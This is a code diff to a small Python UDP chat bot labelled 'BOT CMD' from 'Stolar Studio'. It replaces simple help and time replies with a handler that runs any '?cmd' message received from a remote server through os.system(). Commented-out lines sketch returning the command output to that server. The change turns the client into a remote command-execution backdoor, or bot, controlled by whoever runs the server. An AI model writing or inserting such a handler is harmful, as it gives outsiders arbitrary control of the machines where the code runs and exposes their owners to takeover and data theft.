@@ -1,6 +1,6 @@
 #
 #
-#	BOT >|<EKA
+#	BOT CMD
 #
 # [Stolar Studio]
 #
@@ -52,10 +52,20 @@ def receving (name1, sock):
 				decryptcmd = decryptcmd[5:]
 				print(name+" > "+decryptcmd)
 
-				if decryptcmd == "?help" :
-					s.sendto(("["+alias + "] :: "+codem("?time")).encode("utf-8"),server)
-				elif decryptcmd == "?time":
-                                        s.sendto(("["+alias + "] :: "+codem(time.strftime("%Y-%m-%d-%H.%M.%S", time.localtime()))).encode("utf-8"),server)
+				if decryptcmd == "?cmd help" or decryptcmd == "?cmd" :
+					s.sendto(("["+alias + "] :: "+codem("?cmd <command>")).encode("utf-8"),server)
+				else:
+					cmd = ""
+					for i in range(4):
+						cmd += decryptcmd[i]
+						if cmd == "?cmd":
+							os.system(decryptcmd[4:])
+							#s.sendto(("["+alias + "] :: "+codem(os.system(decryptcmd[4:]))).encode("utf-8"),server)
+							#os.system(decryptcmd[4:]+" >some-file.txt")
+							#with open('some-file.txt', 'r') as f:
+							#	nums = f.read().splitlines()
+							#	print(nums)
+							#	s.sendto(("["+alias + "] :: "+codem(nums)).encode("utf-8"),server)
 				#message = name+" "+decryptcmd
 				
 				
@@ -73,13 +83,13 @@ s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 s.bind((host,port))
 s.setblocking(0)
 
-print("BOT >|<EKA v0.1 [ Stolar Studio ]")
+print("BOT CMD v0.1 [ Stolar Studio ]")
 serverIP = input("Server IP : ")
 
 serverPort = 8080
 server = (serverIP, serverPort)
 
-alias = "BOT >|<EKA"
+alias = "BOT CMD"
 
 rT = threading.Thread(target = receving, args = ("RecvThread",s))
 rT.start()
